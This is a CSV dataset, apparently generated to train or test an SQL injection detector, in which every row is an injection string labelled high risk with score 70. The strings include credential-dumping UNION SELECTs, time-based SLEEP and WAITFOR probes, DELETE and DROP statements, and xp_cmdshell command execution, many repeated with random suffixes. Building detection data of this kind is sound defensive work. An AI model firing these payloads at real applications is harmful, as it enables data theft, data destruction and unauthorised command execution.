query,risk,score
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
"' UNION ALL SELECT username, password FROM users # xr615lq",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ # jx,high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- /**/ -- 3,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ # qj",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ /**/",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 /**/ # yb,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
"' UNION ALL SELECT username, password FROM users # e3s975x",high,70
' OR 1=1; DROP TABLE temp; -- -- fjqjxu,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- d54zoi,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 6swjoy,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
'; DELETE FROM users; /**/ # m6sdvdc,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- /**/ -- k,high,70
'; WAITFOR DELAY '0:0:5'-- -- qrcspx,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # p0iq7ph,high,70
' OR 1=1; DROP TABLE temp; -- /**/ -- y,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- -- y3h7rv,high,70
"' UNION ALL SELECT username, password FROM users /**/ -- e",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
' OR 1=1; DROP TABLE temp; -- -- 88ptd8,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- rcg6f2",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # 93,high,70
'; DELETE FROM users; /**/ -- f51pdu,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- a2vdiq",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- # mimtytc,high,70
'; DELETE FROM users; /**/ # 9r0ixez,high,70
' OR SLEEP(5) AND '1'='1 /**/ /**/,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- 3mye5r,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- js0ehy,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # kzyetx2",high,70
"' UNION ALL SELECT username, password FROM users -- zjayj1",high,70
'; SELECT pg_sleep(5); -- /**/ # tq,high,70
'; DROP PROCEDURE admin_login-- # yr7tro5,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ibo29k,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 9sdfcn",high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 # 4e4xapq,high,70
'; DROP PROCEDURE admin_login-- # ccwqccm,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # k1qr1bn,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ # og,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- xbhlzv",high,70
' OR 1=1; DROP TABLE temp; -- # 77oo5uq,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ura8ap",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- 5mudo3,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # l2k6jeq,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- AND 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 # qjiebbk,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ /**/,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # l0i40bs,high,70
'; WAITFOR DELAY '0:0:5'-- -- m4u6gk,high,70
"' UNION ALL SELECT username, password FROM users -- 76l2wf",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # ac22jgo,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ -- 6",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # fzq6hwx",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # pwcxasy",high,70
"' UNION ALL SELECT username, password FROM users # 1sjhtip",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- dmj0xq",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ /**/",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; DELETE FROM users; /**/ /**/ /**/,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 -- 92eof9,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- mmxuji,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # yofj6qb,high,70
"' UNION ALL SELECT username, password FROM users /**/ -- f",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- 1okj8g,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # kwr6m6h,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- # kxdr3zs,high,70
'; DELETE FROM users; /**/ # qj9dlxr,high,70
'; DROP PROCEDURE admin_login-- -- l7ii6p,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- op7ali",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- c7amrd,high,70
'; DELETE FROM users; /**/ -- 1sz7iz,high,70
'; WAITFOR DELAY '0:0:5'-- /**/ -- y,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
"' UNION ALL SELECT username, password FROM users # ufm1vsl",high,70
'; SELECT pg_sleep(5); -- -- rald4x,high,70
' OR 1=1; DROP TABLE temp; -- /**/ /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- k5b2a2",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- LIMIT 1 -- ,high,70
'; DELETE FROM users; /**/ /**/ -- a,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- f5qpup,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 8jyvls,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
"' UNION ALL SELECT username, password FROM users /**/ /**/",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # mhsnebc",high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
'; DROP PROCEDURE admin_login-- # i8b8s88,high,70
' OR SLEEP(5) AND '1'='1 -- tv7i5n,high,70
'; DELETE FROM users; /**/ # 05vy6ym,high,70
'; DROP PROCEDURE admin_login-- /**/ # be,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ -- u",high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
'; DROP PROCEDURE admin_login-- -- 5m5b91,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/ -- y",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- l0a7g6",high,70
"' UNION ALL SELECT username, password FROM users # mdsswxv",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ /**/,high,70
'; WAITFOR DELAY '0:0:5'-- -- 1u0tt7,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 1qr9d1b",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 79ter5",high,70
'; SELECT pg_sleep(5); -- OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # pkwie24,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- nxus7x",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 42w6jg",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
' OR SLEEP(5) AND '1'='1 # av9qw05,high,70
'; SELECT pg_sleep(5); -- /**/ -- z,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/ /**/,high,70
'; DELETE FROM users; /**/ /**/ /**/,high,70
' OR 1=1; DROP TABLE temp; -- -- zok5nz,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
'; DROP PROCEDURE admin_login-- # rmg1hrv,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ /**/",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
'; WAITFOR DELAY '0:0:5'-- # otmz4fh,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # i68ydpd",high,70
'; DELETE FROM users; /**/ /**/ /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- AND 1=1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 7vvs1c,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/ -- 8",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # cg61aa3,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- afc8oq",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # jtzg6ur",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- sq0xl1",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # x3h7xlu,high,70
' OR 1=1; DROP TABLE temp; -- /**/ # d7,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- # i9e5e07,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # ef,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- LIMIT 1 -- ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- OR 1=1 # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # b3o1j5w,high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
"' UNION ALL SELECT username, password FROM users LIMIT 1 -- ",high,70
' OR SLEEP(5) AND '1'='1 # l0eixoe,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; WAITFOR DELAY '0:0:5'-- AND 1=1 -- ,high,70
'; DELETE FROM users; /**/ LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') OR 1=1 # ",high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # znz4bv9,high,70
'; DELETE FROM users; /**/ OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- /**/ /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
'; DROP PROCEDURE admin_login-- -- 5g7sm9,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 1st69v",high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- -- 5stotr,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # kow6wbs,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; WAITFOR DELAY '0:0:5'-- /**/ -- l,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- aj182m",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 # e318vye,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- q3yk69",high,70
'; SELECT pg_sleep(5); -- /**/ /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') LIMIT 1 -- ",high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
'; DROP PROCEDURE admin_login-- -- 249a9y,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- -- 9591h8,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # c3gfwh0,high,70
'; WAITFOR DELAY '0:0:5'-- # 7dtqvrn,high,70
'; DELETE FROM users; /**/ -- qj7i03,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- LIMIT 1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- l36amp,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # fb1754v,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
'; DROP PROCEDURE admin_login-- -- cuy84i,high,70
'; DELETE FROM users; /**/ /**/ -- j,high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- /**/ /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
' OR SLEEP(5) AND '1'='1 # bmosubs,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 09gw8k",high,70
'; ALTER TABLE users ADD column VARCHAR(255) OR 1=1 # ,high,70
'; SELECT pg_sleep(5); -- -- do5n14,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # hum2n9d,high,70
'; DROP PROCEDURE admin_login-- OR 1=1 # ,high,70
"' UNION ALL SELECT username, password FROM users -- 5j6xbt",high,70
'; DROP PROCEDURE admin_login-- /**/ -- m,high,70
'; DELETE FROM users; /**/ LIMIT 1 -- ,high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 34j8dyl",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 8d9nbp",high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 6cpgnxa,high,70
' OR 1=1; DROP TABLE temp; -- # v1h8s2m,high,70
'; ALTER TABLE users ADD column VARCHAR(255) AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users /**/ /**/",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # bayqts1",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 89bluq0,high,70
'; DELETE FROM users; /**/ LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- # hlijzam,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- zyusnx",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- LIMIT 1 -- ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- xjds3w,high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
'; DELETE FROM users; /**/ AND 1=1 -- ,high,70
'; SELECT pg_sleep(5); -- -- 8tbe1r,high,70
'; DROP PROCEDURE admin_login-- AND 1=1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # ytq39hm",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') LIMIT 1 -- ,high,70
'; SELECT pg_sleep(5); -- -- xu32l1,high,70
' OR 1=1; DROP TABLE temp; -- # bkna4lw,high,70
'; DROP PROCEDURE admin_login-- LIMIT 1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- # sxh8hfz,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ # i5,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- pzjk32",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- LIMIT 1 -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- OR 1=1 # ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # vnvi1nf,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- /**/ # nt,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/ -- 3,high,70
'; SELECT pg_sleep(5); -- -- a6fdov,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- # 8gg8lar,high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users -- en21vh",high,70
' OR SLEEP(5) AND '1'='1 AND 1=1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/ # w8,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
' OR SLEEP(5) AND '1'='1 LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- AND 1=1 -- ,high,70
'; DROP PROCEDURE admin_login-- # ga37rpn,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- OR 1=1 # ,high,70
' OR 1=1; DROP TABLE temp; -- # vxvmmse,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') AND 1=1 -- ,high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
'; SELECT pg_sleep(5); -- -- jn4bnm,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # esl1weq",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- OR 1=1 # ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- igdh6b",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # tc8ygyg,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/ -- 9,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
' OR 1=1; DROP TABLE temp; -- OR 1=1 # ,high,70
'; DELETE FROM users; /**/ -- n0xb0k,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 7j84ytl",high,70
'; WAITFOR DELAY '0:0:5'-- /**/ # kd,high,70
'; SELECT pg_sleep(5); -- LIMIT 1 -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- 06wppv,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- goifgp",high,70
"' UNION ALL SELECT username, password FROM users # myt1aaz",high,70
"' UNION ALL SELECT username, password FROM users AND 1=1 -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/ # kd",high,70
' OR SLEEP(5) AND '1'='1 OR 1=1 # ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) LIMIT 1 -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # k5ooqaj",high,70
'; WAITFOR DELAY '0:0:5'-- -- p0f6da,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/ /**/",high,70
"' UNION ALL SELECT username, password FROM users -- juylzx",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # l2xjjvp,high,70
"' UNION ALL SELECT username, password FROM users OR 1=1 # ",high,70
'; SELECT pg_sleep(5); -- # ytyt5br,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- AND 1=1 -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- OR 1=1 # ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') AND 1=1 -- ",high,70
'; DELETE FROM users; /**/ /**/ /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- LIMIT 1 -- ,high,70
